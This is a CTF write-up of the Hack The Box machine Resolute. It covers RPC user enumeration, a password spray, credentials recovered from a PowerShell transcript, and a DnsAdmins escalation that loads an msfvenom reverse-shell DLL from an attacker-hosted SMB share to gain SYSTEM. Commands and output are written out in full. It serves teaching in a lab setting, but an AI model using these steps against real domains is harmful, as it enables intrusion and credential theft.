---
title: HTB: Resolute
url: https://0xdf.gitlab.io/2020/05/30/htb-resolute.html
date: 2020-05-30T13:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: htb-resolute, ctf, hackthebox, nmap, smb, smbmap, smbclient, rpcclient, rpc, password-spray, crackmapexec, evil-winrm, pstranscript, net-use, dnscmd, msfvenom, smbserver, lolbas, winrm, htb-forest, htb-hackback
---

![Resolute](https://0xdfimages.gitlab.io/img/resolute-cover.png)

It’s always interesting when the initial nmap scan shows no web ports as was the case in Resolute. The attack starts with enumeration of user accounts using Windows RPC, including a list of users and a default password in a comment. That password works for one of the users over WinRM. From there I find the next users creds in a PowerShell transcript file. That user is in the DnsAdmins group, which allows for an attack against dnscmd to get SYSTEM. In beyond root, I’ll identify the tool the box creator used to connect to the box and generate the PowerShell transcript.

## Box Info

| Name | [Resolute](https://hackthebox.com/machines/resolute)  [Resolute](https://hackthebox.com/machines/resolute) [Play on HackTheBox](https://hackthebox.com/machines/resolute) |
| --- | --- |
| Release Date | [07 Dec 2019](https://twitter.com/hackthebox_eu/status/1266020307531370498) |
| Retire Date | 30 May 2020 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Resolute |
| Radar Graph | Radar chart for Resolute |
| First Blood User | 00:17:34[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| First Blood Root | 01:49:12[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [egre55 egre55](https://app.hackthebox.com/users/1190) |

## Recon

### nmap

`nmap` finds a *ton* of open ports:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.169
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-17 19:53 EST
Nmap scan report for 10.10.10.169
Host is up (0.014s latency).
Not shown: 65511 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49687/tcp open  unknown
49911/tcp open  unknown
57306/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 8.98 seconds

root@kali# nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sV -sC -oA scans/nmap-tcpscripts 10.10.10.169
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-17 19:54 EST
Nmap scan report for 10.10.10.169
Host is up (0.013s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-01-18 01:02:23Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf       .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=1/17%Time=5E225762%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h47m32s, deviation: 4h37m09s, median: 7m30s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2020-01-17T17:03:05-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-01-18T01:03:02
|_  start_date: 2020-01-17T22:07:40

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.26 seconds

```

This looks like a Windows host with no firewall up.

### SMB - TCP 445

Without creds, I can’t access any shares with `smbmap` or `smbclient`:

```

root@kali# smbmap -H 10.10.10.169
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.169...
[+] IP: 10.10.10.169:445        Name: 10.10.10.169                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
[!] Access Denied

root@kali# smbmap -H 10.10.10.169 -u 0xdf
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.169
[!] Authentication error on 10.10.10.169

root@kali# smbclient -N -L \\10.10.10.169
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.10.10.169]
Error returning browse list: NT_STATUS_REVISION_MISMATCH
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.169 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available\

```

### RPC - TCP 445

RPC enumeration is not super common on HTB. I showed similar enumeration in [Forest](/2020/03/21/htb-forest.html#rpc---tcp-445). I am able to connect to RPC using null authentication:

```

root@kali# rpcclient -U "" -N 10.10.10.169
rpcclient $> 

```

Now I can list users:

```

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]

```

I can get information about the users one by one with `queryuser`:

```

rpcclient $> queryuser 0x1f4
        User Name   :   Administrator
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Fri, 17 Jan 2020 17:09:01 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST
        Password last set Time   :      Fri, 17 Jan 2020 20:54:03 EST
        Password can change Time :      Sat, 18 Jan 2020 20:54:03 EST
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000002
        logon_count:    0x0000003e
        padding1[0..7]...
        logon_hrs[0..21]...

```

I can also get less information about all users with `querydispinfo`:

```

rpcclient $> querydispinfo
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)

```

This provides not only a list of users, but there’s also an interesting comment for RID 0x457 (marco), `Desc: Account created. Password set to Welcome123!`.

## Shell as melanie

### Test Credentials

#### As marco

I’ll use `crackmapexec` as an easy way to check credentials against SMB.

First I try as marco, but it doesn’t work:

```

root@kali# crackmapexec smb 10.10.10.169 -u marco -p 'Welcome123!' --continue-on-success
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:MEGABANK) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\marco:Welcome123! STATUS_LOGON_FAILURE 

```

I tried connecting with [EvilWinRM](https://github.com/Hackplayers/evil-winrm) as well, but no luck.

#### Password Spray

Password spraying is similar to a password brute force, except you only try one (or a few common passwords) across a lot of users. The benefit to the attacker is that you don’t risk locking out any single account, and in a case where you only need a foothold, it’s very common in a large organization to find at least one user using a really bad guessable password.

I grabbed the list of users from `rpcclient`, and dropped them into a file. Then I ran `crackmapexec` using that list as the user input. It found a user still using `Welcome123!`:

```

root@kali# crackmapexec smb 10.10.10.169 -u users -p 'Welcome123!' --continue-on-success
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:MEGABANK) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\Administrator:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\Guest:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [+] MEGABANK\melanie:Welcome123! 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\zach:Welcome123! STATUS_ACCESS_DENIED 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\simon:Welcome123! STATUS_ACCESS_DENIED 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\naoki:Welcome123! STATUS_ACCESS_DENIED 

```

Fourth from the bottom, there’s success for melanie.

### WinRM Shell

I don’t know if malanie is an administrator or in the Remote Management Users group, but it’s worth a shot to see if I can EvilWinRM to get a shell as melanie. It works:

```

root@kali# evil-winrm -i 10.10.10.169 -P 5985 -u melanie -p 'Welcome123!'

Info: Starting Evil-WinRM shell v1.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\melanie\Documents> 

```

And get `uset.txt`:

```
*Evil-WinRM* PS C:\Users\melanie\desktop> type user.txt
0c3be45f************************

```

## Priv: melanie –> ryan

### Enumeration

After looking around melanie’s home directory and not finding anything useful, I went to the filesystem root:

```
*Evil-WinRM* PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name    
----                -------------         ------ ----    
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d-r---        12/4/2019   2:46 AM                Users   
d-----        12/4/2019   5:15 AM                Windows 

```

In PowerShell, `ls` is an alias for `Get-ChildItem` or `gci`. On windows, it’s often a good idea to run that with `-force`, kind of like running `ls -a`.

```
*Evil-WinRM* PS C:\> ls -force

    Directory: C:\

Mode                LastWriteTime         Length Name    
----                -------------         ------ ----    
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users   
d-----        12/4/2019   5:15 AM                Windows 
-arhs-       11/20/2016   5:59 PM         389408 bootmgr 
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT 
-a-hs-        1/17/2020   2:07 PM      402653184 pagefile.sys   

```

In diving through the various hidden folders, `PSTranscripts` seemed interesting. It contained one file:

```
*Evil-WinRM* PS C:\> gci -recurse -force -file PSTranscripts

    Directory: C:\PSTranscripts\20191203

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt    

```

Without having to know much about what’s going on in the transcript (I’ll look in [Beyond Root](#beyond-root---powershell-transcript)), this jumped out:

```

PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"                
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

```

There’s a `net use` command trying to map a share into drive `X:` using ryan’s password.

### WinRM Shell

#### Checking Permissions

Given that I believe ryan is using remote WinRM to execute commands in the transcript (I’ll explain in [Beyond Root](#beyond-root---powershell-transcript)), I feel pretty confident I can Evil-WinRM for ryan as well. When solving, I just tried it, and it works. But it’s worth showing how I can verify these creds.

Locally, I can check the user’s groups:

```
*Evil-WinRM* PS C:\> net user ryan
User name                    ryan
Full Name                    Ryan Bertrand
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/29/2020 7:35:12 AM
Password expires             Never
Password changeable          5/30/2020 7:35:12 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Contractors
The command completed successfully.

```

ryan actually isn’t in Remote Management Users. But he is in Contractors, and Contractors is:

```
*Evil-WinRM* PS C:\> net localgroup "Remote Management Users"
Alias name     Remote MAnagement Users
Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

Members
-------------------------------------------------------------------------------
Contractors
melanie
The command completed successfully.

```

From my Kali box, I can also check the creds with `crackmapexec`:

```

root@kali# crackmapexec smb 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:MEGABANK) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] MEGABANK\ryan:Serv3r4Admin4cc123! (Pwn3d!)

```

The creds are valid for SMB. The `(Pwn3d!)` there sent me down a rabbit hole that I haven’t found the end of yet and thus didn’t make it into this post. That typically indicates that ryan can PSExec, but it fails. I’ve walked the source code and understand what is happening. There might even be a shell out of it (but also maybe not). I’ll see if the rabbit hole makes an interesting follow on blog post. Anyway…

`crackmapexec` can also check WinRM, and ryan can authenticate:

```

root@kali# crackmapexec winrm 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
WINRM       10.10.10.169    5985   RESOLUTE         [*] http://10.10.10.169:5985/wsman
WINRM       10.10.10.169    5985   RESOLUTE         [+] MEGABANK\ryan:Serv3r4Admin4cc123! (Pwn3d!)

```

#### Shell

As shown above (or most of us probably just found out when trying it), the creds work to get a shell as ryan:

```

root@kali# evil-winrm -i 10.10.10.169 -P 5985 -u ryan -p 'Serv3r4Admin4cc123!'

Evil-WinRM shell v2.1

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents>

```

## Priv: ryan –> SYSTEM

### Enumeration

#### note.txt

Right away I find `note.txt` on ryan’s desktop:

```
*Evil-WinRM* PS C:\Users\ryan\desktop> type note.txt
Email to team:
- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute

```

So any changes I make to the system will have to be completely used within a minute (or less). Good to keep in mind.

#### DnsAdmins

I checked out ryan’s groups, and noted an interesting one:

```
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

```

The [Microsoft Documentation](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins) describes this DnsAdmins as:

> Members of DNSAdmins group have access to network DNS information. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions.

By default the DNSAdmins don’t have the ability to start or stop the DNS service, but it’s not unusual for an admin to give this group that privilege.

### dnscmd

#### Vulnerability

Some googling around for this group led me to the [lolbas page](https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/) for `dnscmd` to load a dll over a UNC path. There’s a command to set a server level plugin dll:

```

dnscmd.exe /config /serverlevelplugindll \\path\to\dll

```

From [this blog post](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83):

> First, trying to run this as a weak domain user with no special permissions on the DNS server object (other than Generic Read, which is granted to all members of the Pre-Windows 2000 Compatible Access group, which by default contains the Domain Users group), the command fails with an access denied message. If we give our weak user write access to the server object, the command no longer fails. This means that members of DnsAdmins can successfully run this command.

Since ryan is in DnsAdmins, this is promising.

#### A Note About OPSEC

The attack here is to tell the DNS service on Resolute to use my dll as a plugin. I’m going to use `msfvenom` to create a dll that will, on loading, connect back to me. When `msfvenom` creates this payload, it will connect back, and wait for that session to end before continuing. This will hang the DNS service on Resolute. That’s fine for a CTF, but would make for a bad day in a real pentest.

To get around this, you can create a payload that starts the reverse shell in a new thread, and then continues, so that the DNS server can continue to start. IppSec tells me he’s going to walk through creating this payload in his video today if you are interested to check that out.

#### Create Payload

I’ll start with a basic `msfvenom` reverse shell payload as a dll. Defender is running on this host, and if I put the output file there, it does get eaten, but over a UNC path to a share it might be ok.

```

root@kali# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=443 -f dll -o rev.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 5120 bytes
Saved as: rev.dll

```

Now, from that same directory, I’ll run an SMB server:

```

root@kali# smbserver.py s .
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

#### Execute Attack

I’ll need to run three commands:
1. Set the server level plugin to be `rev.dll` on my share.
2. Stop the DNS server.
3. Start the DNS server.

I’ll need to do this all within a minute (or less) because, as `note.txt` told me, things revert quickly.

With `nc` listening, I execute the attack:

```
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.14.11\s\rev.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe \\resolute stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe \\resolute start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2644
        FLAGS              :

```

First I’ll see the connection on the SMB server:

```

[*] Incoming connection (10.10.10.169,50159)
[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)
[*] User RESOLUTE\RESOLUTE$ authenticated successfully
[*] RESOLUTE$::MEGABANK:4141414141414141:fb2d88a95f9cf568c546d27ebe4f4442:010100000000000000a96d1a1fced50122c6db1ce67cdf66000000000100100075006300660071006d006e00520061000300100075006300660071006d006e00520061000200100068006b007200
490048006100620041000400100068006b007200490048006100620041000700080000a96d1a1fced50106000400020000000800300030000000000000000000000000400000f4655d8aeeeb9ce2a98b0b270af2bf358acccfb17c8276e41e29b51b4ecddc1a0a001000000000000000000000
000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310031000000000000000000

```

Then I’ll get a shell:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.169.
Ncat: Connection from 10.10.10.169:50160.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```

And from there, grab `root.txt`:

```

C:\Users\Administrator\Desktop>type root.txt
e1d94876************************

```

## Beyond Root - PowerShell Transcript

I didn’t include the full transcript above, but here it is:

```
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Command start time: 20191203063455
**********************
PS>TerminatingError(): "System error."
>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Command start time: 20191203063455
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
